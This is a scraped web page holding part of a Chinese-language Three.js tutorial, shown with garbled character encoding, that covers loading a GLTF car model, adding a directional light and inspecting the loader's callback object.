            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/251124329220663/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    XiaoYu2002
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T07:49:25.000Z" title="Thu Jan 08 2026 07:49:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;color:rgba(46,36,36,.87);overflow-x:hidden}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{margin-bottom:5px;font-size:30px;font-weight:500}.markdown-body h1:before{content:"#";margin-right:10px;color:#1976d2}.markdown-body h2{font-size:28px;font-weight:400;border-left:5px solid #454545;margin-top:20px;padding-left:10px;transition:all .3s ease-in-out}.markdown-body h2:hover{border-color:#1976d2}.markdown-body h3{font-size:24px;font-weight:400;margin-top:15px;padding-bottom:0}.markdown-body h4{font-size:20px;font-weight:500}.markdown-body h5{font-size:16px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body h2:first-letter,.markdown-body h3:first-letter,.markdown-body p:first-letter{text-transform:capitalize}.markdown-body em{text-emphasis:dot;text-emphasis-position:under}.markdown-body img{display:block;margin:0 auto!important;max-width:100%;border-radius:2px;box-shadow:0 2px 4px -1px rgba(0,0,0,.2),0 4px 5px 0 rgba(0,0,0,.14),0 1px 10px 0 rgba(0,0,0,.12)!important}.markdown-body hr{position:relative;width:98%;height:1px;border:none;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,#ddd,#999,#ddd);overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background:#fff;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center}.markdown-body code{font-weight:900;word-break:break-word;border-radius:2px;overflow-x:auto;font-size:.87em;padding:.065em .4em;background-color:#fbe5e1;color:#c0341d}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border-radius:0 4px}.markdown-body pre&gt;code{font-weight:400;font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{margin:0 4px;text-decoration:none;color:#027fff;transition:all .3s ease-in-out;padding-bottom:4px;border-bottom:2px solid transparent}.markdown-body a:after{content:"";display:inline-block;width:18px;height:18px;margin-left:4px;vertical-align:middle;background-image:url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyMiIgaGVpZ2h0PSIyMiI+PGcgZmlsbD0ibm9uZSIgZmlsbC1ydWxlPSJldmVub2RkIiBzdHJva2U9IiMwMjdGRkYiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCI+PHBhdGggZD0iTTkuODE1IDYuNDQ4bDEuOTM2LTEuOTM2YzEuMzM3LTEuMzM2IDMuNTgtMS4yNTkgNS4wMTMuMTczIDEuNDMyIDEuNDMyIDEuNTEgMy42NzYuMTczIDUuMDEzbC0xLjQ1MiAxLjQ1Mi0uOTY4Ljk2OGMtMS4zMzcgMS4zMzYtMy41ODEgMS4yNTktNS4wMTMtLjE3MyIvPjxwYXRoIGQ9Ik0xMS4yNjcgMTUuMzY3bC0xLjkzNiAxLjkzNmMtMS4zMzYgMS4zMzctMy41OCAxLjI2LTUuMDEyLS4xNzMtMS40MzItMS40MzItMS41MS0zLjY3Ni0uMTczLTUuMDEybDEuNDUyLTEuNDUyLjk2OC0uOTY4YzEuMzM2LTEuMzM3IDMuNTgtMS4yNiA1LjAxMi4xNzMiLz48L2c+PC9zdmc+);background-size:cover;background-repeat:no-repeat}.markdown-body a:hover{border-color:#027fff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body a.footnote-backref:after,.markdown-body a.footnote-ref:after,.markdown-body sup a:after{display:none!important}.markdown-body table{margin:0 auto 10px;font-size:12px;width:auto;max-width:100%;overflow:auto;border:2px solid #c6c6c6}.markdown-body table img{box-shadow:none!important}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body del{color:rgba(0,0,0,.6)}.markdown-body blockquote{position:relative;color:#666;padding:5px 23px 1px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:hsla(0,0%,78.4%,.12);transition:all .2s ease-in-out}.markdown-body blockquote:hover{border-color:#1976d2}.markdown-body blockquote:after,.markdown-body blockquote:before{position:absolute;font-size:24px;font-weight:800;line-height:24px;color:#cbcbcb;opacity:.6}.markdown-body blockquote:before{content:"â€œ";top:4px;left:6px}.markdown-body blockquote:after{content:"â€";right:8px;bottom:-8px}.markdown-body blockquote&gt;p,.markdown-body blockquote blockquote{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body details{outline:none;border:none;border-left:4px solid #1976d2;padding-left:10px;margin-left:4px}.markdown-body details summary{cursor:pointer;border:none;outline:none;background:#fff;margin:0 -17px}.markdown-body details summary:hover::-webkit-details-marker{color:#1976d2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">9.1 åˆå§‹åŒ–è½½å…¥æ¨¡å‹</h2>
<p>GLTFï¼ˆGL Transmission Formatï¼‰æ˜¯ä¸€ç§ä¸“ä¸ºWebå’Œå®æ—¶åº”ç”¨è®¾è®¡çš„é«˜æ•ˆ3Dæ¨¡å‹æ–‡ä»¶æ ¼å¼ï¼Œè¢«ç§°ä¸ºâ€œ3Dé¢†åŸŸçš„JPEGâ€ã€‚å®ƒé‡‡ç”¨JSONç»“æ„æè¿°åœºæ™¯å±‚çº§ã€æè´¨ã€åŠ¨ç”»ç­‰å…ƒæ•°æ®ï¼Œå¹¶å°†çº¹ç†ã€å‡ ä½•ä½“ç­‰èµ„æºä»¥äºŒè¿›åˆ¶æˆ–ç‹¬ç«‹æ–‡ä»¶å½¢å¼å­˜å‚¨ï¼Œä»è€Œå®ç°å°ä½“ç§¯ã€å¿«é€Ÿè§£æå’Œå®Œæ•´åŠŸèƒ½æ”¯æŒã€‚</p>
<p>åœ¨Three.jsä¸­ï¼Œé€šå¸¸ä½¿ç”¨GLTFLoaderåŠ è½½GLTFæ–‡ä»¶ï¼ŒåŠ è½½åçš„æ¨¡å‹ä»¥åœºæ™¯å›¾å½¢å¼å‘ˆç°ï¼Œå¯ç›´æ¥èå…¥ç°æœ‰ä¸‰ç»´åœºæ™¯å¹¶è¿›è¡ŒåŠ¨ç”»æ§åˆ¶ã€äº¤äº’è°ƒæ•´ç­‰æ“ä½œï¼Œæˆä¸ºè¿æ¥ä¸“ä¸šå»ºæ¨¡å·¥å…·ï¼ˆå¦‚Blenderï¼‰ä¸WebGLåº”ç”¨çš„å…³é”®æ¡¥æ¢ã€‚</p>
<p>æˆ‘ä»¬è½½å…¥ä¸€ä¸ªè½¦çš„æ¨¡å‹ï¼Œéœ€è¦å¯¹åº”çš„æ–‡ä»¶scene.gltfå¯ä»¥æ‰¾æˆ‘è·å–ã€‚</p>
<p>Three.jsä½¿ç”¨æ¨¡å‹ä¾æ—§éœ€è¦é€šè¿‡åœºæ™¯ï¼Œæ­¥éª¤å¦‚ä¸‹3æ­¥ï¼š</p>
<p>ï¼ˆ1ï¼‰åˆ›å»ºåœºæ™¯ã€‚</p>
<p>ï¼ˆ2ï¼‰åŠ è½½GLTFæ–‡ä»¶ï¼ˆæ¨¡å‹ï¼‰ã€‚</p>
<p>ï¼ˆ3ï¼‰å°†åŠ è½½åçš„æ¨¡å‹æ”¾å…¥åœºæ™¯ä¸­ã€‚</p>
<p>è½½å…¥çš„GLTFæ¨¡å‹ï¼Œå¯ä»¥ç®€å•çš„ç†è§£ä¸ºæ˜¯ä¸€ä¸ªç‰©å“ï¼Œå³è¢«è§‚å¯Ÿå¯¹è±¡ã€‚å› æ­¤åƒç›¸æœºã€æ¸²æŸ“å™¨ä»¥åŠè½¨é“æ§åˆ¶å™¨ä¾æ—§æ˜¯éœ€è¦çš„ã€‚GLTFæ¨¡å‹åªæ˜¯åœºæ™¯ä¸­çš„ä¸€éƒ¨åˆ†ï¼Œè€Œéå…¨éƒ¨ã€‚ä»¥ä¸‹ç¤ºä¾‹æ˜¯è½½å…¥ä¸€è¾†æ±½è½¦ï¼Œå¦‚æœéœ€è¦çš„è¯ï¼Œå¯ä»¥è½½å…¥æ›´å¤šçš„æ¨¡å‹æˆ–è€…ä¸ç½‘æ ¼æ··åˆå»ä½¿ç”¨ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> <span class="hljs-variable constant_">THREE</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"three"</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">OrbitControls</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'three/examples/jsm/controls/OrbitControls.js'</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">GLTFLoader</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'three/examples/jsm/loaders/GLTFLoader.js'</span>

<span class="hljs-comment">// 1. åˆ›å»ºåœºæ™¯</span>
<span class="hljs-keyword">const</span> scene = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Scene</span>()

<span class="hljs-comment">// 2. åŠ è½½GLTFæ–‡ä»¶ï¼ˆæ¨¡å‹ï¼‰</span>
<span class="hljs-keyword">const</span> loader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">GLTFLoader</span>();
loader.<span class="hljs-title function_">load</span>(<span class="hljs-string">'./car/scene.gltf'</span>, <span class="hljs-function">(<span class="hljs-params">gltf</span>) =&gt;</span> {
  <span class="hljs-comment">// 3. å°†åŠ è½½åçš„æ¨¡å‹æ”¾å…¥åœºæ™¯ä¸­</span>
  scene.<span class="hljs-title function_">add</span>(gltf.<span class="hljs-property">scene</span>)
})

<span class="hljs-comment">//åˆ›å»ºç›¸æœº</span>
<span class="hljs-keyword">const</span> camera = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">PerspectiveCamera</span>(<span class="hljs-number">30</span>, <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span> / <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span>, <span class="hljs-number">0.1</span>, <span class="hljs-number">1000</span>);
camera.<span class="hljs-property">position</span>.<span class="hljs-title function_">set</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">20</span>);
scene.<span class="hljs-title function_">add</span>(camera);

<span class="hljs-comment">//åˆ›å»ºæ¸²æŸ“å™¨</span>
<span class="hljs-keyword">const</span> renderer = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">WebGLRenderer</span>();
renderer.<span class="hljs-title function_">setSize</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span>, <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span>);
<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(renderer.<span class="hljs-property">domElement</span>);
renderer.<span class="hljs-title function_">render</span>(scene, camera);

<span class="hljs-comment">//åˆ›å»ºè½¨é“æ§åˆ¶å™¨</span>

<span class="hljs-keyword">const</span> controls = <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrbitControls</span>(camera, renderer.<span class="hljs-property">domElement</span>);

<span class="hljs-keyword">const</span> <span class="hljs-title function_">animate</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-title function_">requestAnimationFrame</span>(animate);
  controls.<span class="hljs-title function_">update</span>();
  renderer.<span class="hljs-title function_">render</span>(scene, camera);
}
<span class="hljs-title function_">animate</span>();
</code></pre>
<p>GLTFæ¨¡å‹-è½¦æ¨¡å‹å±•ç¤ºå¦‚å›¾9-1æ‰€ç¤ºï¼Œå¯è§çš„åªæœ‰è½¦ç¯éƒ¨åˆ†ï¼Œè½¦æ¨¡å‹å…¶ä½™ä½ç½®ä¹Œæ¼†å˜›é»‘çš„ï¼Œè¿™æ„å‘³ç€æ‰€è½½å…¥çš„æ¨¡å‹çš„æè´¨ä¹Ÿæ˜¯å—å…‰ç…§å½±å“çš„ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/88cbb466d3b943e08f45a13ac20fb39c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgWGlhb1l1MjAwMg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768463365&amp;x-signature=ep%2B%2FxJJWvek9u8xmrhjShQWjTqs%3D" alt="image-20251219013349868" loading="lazy"/></p>
<p align="center">
 <b> å›¾9-1 GLTFæ¨¡å‹-è½¦æ¨¡å‹å±•ç¤º</b>
</p>
<h2 data-id="heading-1">9.2 æ·»åŠ ç¯å…‰</h2>
<p>å—å…‰ç…§å½±å“å…¶å®å¯¹äºè½¦æ¨¡å‹æ¥è¯´æ˜¯ä¸€ä»¶æ­£å¸¸çš„äº‹æƒ…ï¼Œå› ä¸ºå…‰ç…§å¯¹GLTFè½¦æ¨¡çš„å¡‘é€ ä¼˜åŠ¿éå¸¸æ˜æ˜¾ï¼Œå½“å¹³è¡Œå…‰ä»¥ä½è§’åº¦æ è¿‡è½¦èº«æ—¶ï¼Œé’£é‡‘ä»¶ä¸Šè¿ç»­çš„é«˜å…‰ä¼šæ²¿ç‰¹å¾çº¿ç²¾ç¡®æµåŠ¨ï¼›è€Œèšå…‰ç¯ä»ä¾§å‰æ–¹æŠ•å°„æ—¶ï¼Œä¸ä»…èƒ½åœ¨è½®æ¯‚è¾æ¡é—´é›•ç¢å‡ºå¤æ‚çš„é•‚ç©ºé˜´å½±ï¼Œæ›´èƒ½è®©å‰æ ¼æ …çš„ç«‹ä½“é€ å‹ä¸ä¿é™©æ çš„è¿›æ°”å£ç»“æ„äº§ç”Ÿæˆå‰§æ€§çš„æ·±æµ…å¯¹æ¯”ï¼Œå°†é™æ€æ¨¡å‹è½¬åŒ–ä¸ºå…·æœ‰è§†è§‰å™ç‡çš„åŠ¨æ€å±•ç¤ºã€‚</p>
<p>ä»æŠ€æœ¯å®ç°å±‚é¢ï¼Œä¸“ä¸šå¯¼å‡ºçš„GLTFæ¨¡å‹é€šå¸¸å†…åµŒåŸºäºç‰©ç†çš„æ¸²æŸ“æè´¨ï¼Œèƒ½ä¸Three.jsçš„å…‰ç…§ç³»ç»Ÿæ·±åº¦äº’åŠ¨ã€‚é‡‘å±æ¼†æè´¨åœ¨ç¯å¢ƒå…‰é®è”½ä¸‹ä¼šå‘ˆç°ç»†è…»çš„é¢—ç²’å±‚æ¬¡ï¼Œè½¦çª—ç»ç’ƒçš„è²æ¶…å°”åå°„ä¼šéšè§‚å¯Ÿè§’åº¦åŠ¨æ€å˜åŒ–ï¼›é€šè¿‡æ­é…HDRç¯å¢ƒè´´å›¾ï¼Œè½¦ä½“è¡¨é¢ä¸ä»…èƒ½åå°„æ¨¡æ‹Ÿå¤©ç©ºç›’çš„æŸ”å…‰ï¼Œæ›´èƒ½ç²¾å‡†å‘ˆç°å‘¨å›´è™šæ‹Ÿç¯å¢ƒçš„å€’å½±ï¼Œä½¿çƒ¤æ¼†è¡¨é¢äº§ç”Ÿæ·±é‚ƒçš„é•œé¢è´¨æ„Ÿä¸è‰²å½©é¥±å’Œåº¦ã€‚è¿™ç§å…‰ç…§ä¸æè´¨çš„ååŒä½œç”¨ï¼Œè®©æ¨¡å‹æ‘†è„±äº†â€œç©å…·æ„Ÿâ€ï¼Œåœ¨ç½‘é¡µä¸­è¿˜åŸå‡ºæ¥è¿‘å½±è§†çº§çš„çœŸå®æè´¨è¡¨ç°ä¸ç©ºé—´æ²‰æµ¸æ„Ÿã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">//æ·»åŠ ç¯å¢ƒå…‰</span>
<span class="hljs-keyword">const</span> light = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">DirectionalLight</span>(<span class="hljs-number">0xffffff</span>, <span class="hljs-number">100</span>);    
light.<span class="hljs-property">position</span>.<span class="hljs-title function_">set</span>(<span class="hljs-number">100</span>, <span class="hljs-number">100</span>, <span class="hljs-number">100</span>);
scene.<span class="hljs-title function_">add</span>(light);
</code></pre>
<p>æˆ‘ä»¬åœ¨ç›¸æœºåˆ›å»ºä¹‹å‰æ·»åŠ ç¯å¢ƒå…‰ï¼Œç„¶ååŠ å…¥åœºæ™¯ä¸­ã€‚è½¦æ¨¡å‹å…‰ç…§å±•ç¤ºå¦‚å›¾9-2æ‰€ç¤ºã€‚å¯ä»¥çœ‹è§è½¦çš„å®Œæ•´ç»“æ„ï¼Œéšç€é¼ æ ‡çš„æ‹–æ‹½ï¼Œå¯ä»¥çœ‹åˆ°ä¸åŒè§’åº¦ä¸‹çš„è½¦æ¨¡å‹å’Œå¯¹åº”åå…‰ï¼Œé€šè¿‡é¼ æ ‡æ»šè½®æ›´æ˜¯å¯ä»¥æ‹‰è¿‘æˆ–è€…è¿œç¦»è§†è§’ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a37aac81129641eeaa41f21cee0362e1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgWGlhb1l1MjAwMg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768463365&amp;x-signature=CPvgogWr1NmgAOdcsGHiLTO4Sws%3D" alt="image-20251219014028187" loading="lazy"/></p>
<p align="center">
 <b> å›¾9-2 GLTFæ¨¡å‹-è½¦æ¨¡å‹å…‰ç…§å±•ç¤º</b>
</p>
<p>å½“æˆ‘ä»¬é€šè¿‡loader.load()åŠ è½½GLTFæ¨¡å‹æ—¶ï¼Œå¯ä»¥æ‹¿åˆ°å›è°ƒå‚æ•°gltfï¼Œå›è°ƒå‚æ•°gltfæ˜¯ä¸€ä¸ªç»“æ„åŒ–çš„å¯¹è±¡ï¼Œå®ƒæ˜¯æˆ‘ä»¬æ“ä½œæ•´ä¸ªåŠ è½½æ¨¡å‹çš„å…¥å£ã€‚æœ€å¸¸ç”¨çš„æ˜¯gltf.sceneï¼Œè¿™æ˜¯æ•´ä¸ªåŠ è½½æ¨¡å‹çš„æ ¹åœºæ™¯å¯¹è±¡ï¼Œç±»å‹ä¸º THREE.Group æˆ– THREE.Sceneã€‚éœ€è¦å°†å®ƒåŠ å…¥ä¸»åœºæ™¯ä¸­æ‰èƒ½æ˜¾ç¤ºã€‚</p>
<p>é™¤æ­¤ä¹‹å¤–è¿˜æœ‰gltf.sceneså’Œgltf.animationsï¼Œåˆ†åˆ«å¦‚ä¸‹ï¼š</p>
<p>ï¼ˆ1ï¼‰gltf.scenesï¼šå¤šåœºæ™¯æƒ…å†µï¼Œä¸€ä¸ªåŒ…å«æ‰€æœ‰åœºæ™¯çš„æ•°ç»„ã€‚å¤§å¤šæ•°GLTFæ–‡ä»¶åªæœ‰ä¸€ä¸ªåœºæ™¯ï¼Œæ­¤æ—¶ gltf.scenes[0] ç­‰ä»·äº gltf.sceneã€‚å¦‚å›¾9-3çš„scenesä¸º[Group]å°±ç­‰åŒäºsceneå­—æ®µé‡Œçš„å†…å®¹ã€‚</p>
<p>ï¼ˆ2ï¼‰gltf.animationsï¼šåŒ…å«æ¨¡å‹æ‰€æœ‰åŠ¨ç”»å‰ªè¾‘çš„æ•°ç»„ã€‚è‹¥æ¨¡å‹æœ‰åŠ¨ç”»ï¼ˆå¦‚è§’è‰²è¡Œèµ°ã€æœºæ¢°è¿åŠ¨ï¼‰ï¼Œéœ€é…åˆTHREE.AnimationMixer ä½¿ç”¨ã€‚</p>
<p>å…¶ä»–çš„æ˜¯é¢å¤–ä¿¡æ¯ï¼Œä¾‹å¦‚assetå…ƒä¿¡æ¯ä¸­ï¼ŒåŒ…å«äº†è¯¥æ¨¡å‹ä»å“ªä¸ªç½‘ç«™ä¸‹è½½çš„ä»¥åŠè¯¥GLTFæ¨¡å‹çš„ç‰ˆæœ¬ã€‚camerasæ˜¯å†…ç½®ç›¸æœºï¼Œè¿™ä¸ªæ¨¡å‹æ²¡æœ‰ï¼Œæ‰€ä»¥æ˜¯ç©ºæ•°ç»„ã€‚parseræ˜¯GLTFçš„è§£æå™¨ï¼Œä¸éœ€è¦å»ç®¡ï¼Œè°ƒç”¨oader.load()æ–¹æ³•æ—¶ï¼Œæ–¹æ³•å†…éƒ¨ä¼šè‡ªåŠ¨è°ƒç”¨è§£æå™¨å»è§£æã€‚userDataæ˜¯å¯ä»¥è‡ªå®šä¹‰çš„éƒ¨åˆ†ã€‚å›è°ƒå‚æ•°gltfä¿¡æ¯å¦‚å›¾9-3æ‰€ç¤ºã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e94753891c3e4bee81c2ba0bc0a33961~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgWGlhb1l1MjAwMg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768463365&amp;x-signature=5c2%2F0PhNI0a1OtR10XK5aqe%2FDZE%3D" alt="image-20251219015023225" loading="lazy"/></p>
<p align="center">
 <b> å›¾9-3 å›è°ƒå‚æ•°gltfä¿¡æ¯</b>
</p>
<p>ç›®å‰æˆ‘ä»¬çš„è½¦æ¨¡å‹æ˜¯é“¶ç™½è‰²çš„ï¼Œå¦‚æœæƒ³æŠŠè½¦æŸ“æˆç»¿çš„ï¼Œä¹Ÿæ˜¯å¯ä»¥åšåˆ°çš„ã€‚è½¦æ¨¡å‹ä¹Ÿæ˜¯é€šè¿‡å„ç§æè´¨å»æ‹¼æ¥è€Œæˆçš„ï¼Œæ‰€ä»¥åªè¦æ‰¾åˆ°è½¦æ¨¡å‹çš„æè´¨ï¼Œå°±å¯ä»¥è°ƒæ•´è½¦å¤–è¡¨çš„æ ·å¼ã€‚</p>
<p>è€Œç½‘æ ¼ç­‰äºå‡ ä½•ä½“åŠ æè´¨ï¼Œè¿™æ„å‘³ç€éœ€è¦æˆ‘ä»¬å»æ‰¾åˆ°è½¦æ¨¡å‹çš„ç½‘æ ¼ï¼Œæ‰¾åˆ°ç½‘æ ¼å°±åŸºæœ¬ä¸Šæ‰¾åˆ°æè´¨äº†ã€‚ä»å›è°ƒå‚æ•°gltfä¸­å»æ‰¾ã€‚ä½ç½®å¦‚ä¸‹ï¼šscenes[0].children[0].children[0].childrenï¼ˆç›´æ¥ä»sceneå¼€å§‹ä¹Ÿå¯ä»¥ï¼‰ã€‚å›è°ƒå‚æ•°gltfä¿¡æ¯çš„ç½‘æ ¼å‚æ•°å¦‚å›¾9-4æ‰€ç¤ºã€‚å¯ä»¥çœ‹åˆ°ä¸€å…±æœ‰59ä¸ªç½‘æ ¼ï¼Œå› æ­¤è½¦æ¨¡å‹å®é™…æ˜¯ç”±59ä¸ªç½‘æ ¼æ‹¼æ¥èµ·æ¥çš„ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/04d30912d63845db87446e6c14c64549~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgWGlhb1l1MjAwMg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768463365&amp;x-signature=ASY5vT0WeXgYiSNurwq9hgk%2FtDg%3D" alt="image-20251219020232471" loading="lazy"/></p>
<p align="center">
